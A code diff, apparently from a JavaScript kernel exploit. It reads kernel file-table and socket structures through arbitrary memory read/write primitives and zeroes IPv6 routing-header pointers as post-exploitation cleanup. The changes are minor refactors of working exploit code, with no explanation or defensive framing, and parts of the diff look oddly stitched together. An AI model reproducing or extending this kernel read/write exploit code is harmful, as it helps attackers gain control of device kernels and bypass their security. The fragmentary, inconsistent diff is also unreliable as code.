@@ -1222,16 +1222,16 @@ function get_fd_data_addr(sock) {
 */
     
 function get_fd_data_addr(sock) {
-  const filep = kmem.read64(ofiles + sock * SIZEOF_OFILES);
-  return kmem.read64(filep);
+  const idx = sock;  
+  const filep = kmem.read64(ofiles + idx * SIZEOF_OFILES);  
+  return kmem.read64(filep);   
 }
 
 function get_sock_pktopts(sock) {
-  const sock_data = get_fd_data_addr(sock);
-  const pcb = kmem.read64(sock_data + SO_PCB);
+  const sock_data = get_fd_data_addr(sock);       
+  const pcb       = kmem.read64(sock_data + SO_PCB);
   return kmem.read64(pcb + INPCB_PKTOPTS);
 }
-
     
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
@@ -1536,10 +1536,10 @@ function get_sock_pktopts(sock) {
 
 for (let i = 0; i < sds.length; i++) {
   const pkto = get_sock_pktopts(sds[i]);
-  kmem.write64(pkto + off_ip6po_rthdr, 0);
+  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
 }
-kmem.write64(get_sock_pktopts(reclaim_sock) + off_ip6po_rthdr, 0);
-kmem.write64(worker_pktopts + off_ip6po_rthdr, 0);
+kmem.write64(get_sock_pktopts(reclaim_sock).add(off_ip6po_rthdr), 0);
+kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
 
 const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
